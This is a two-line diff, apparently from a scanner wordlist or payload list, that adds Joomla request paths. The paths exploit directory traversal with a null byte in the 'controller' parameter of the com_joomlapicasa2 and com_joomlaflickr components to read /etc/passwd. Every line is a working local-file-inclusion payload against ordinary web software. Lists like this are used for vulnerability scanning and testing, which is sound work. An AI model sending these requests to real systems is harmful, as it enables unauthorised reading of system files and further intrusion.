@@ -1,0 +1,2 @@
+/index.php?option=com_joomlapicasa2&controller=../../../../../etc/passwd%00
+/index.php?option=com_joomlaflickr&controller=../../../../../../../../../../etc/passwd%00
